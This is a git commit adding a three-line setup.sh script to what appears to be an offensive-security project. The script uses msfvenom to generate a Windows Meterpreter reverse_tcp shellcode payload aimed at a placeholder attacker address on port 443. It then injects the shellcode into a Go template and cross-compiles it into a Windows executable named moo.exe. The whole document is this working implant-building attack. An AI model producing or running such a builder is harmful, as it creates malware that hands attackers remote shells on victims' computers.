f2f10c103487c58166e260afedade6411096f1f2
n00py <n00py@protonmail.com>
2020-01-31 12:41:20 -0700

    Create setup.sh

---
+++ setup.sh
@@ -0,0 +1,3 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=443   -f hex |  sed 's/../0x&/g' |  sed 's/.\{4\}/&, /g' > shellocode.txt
+sed "s/SHELLYTIME/`cat shellocode.txt`/g" main.go > new.go
+GO111MODULE=on GOOS=windows GOARCH=amd64 go build -o moo.exe new.go
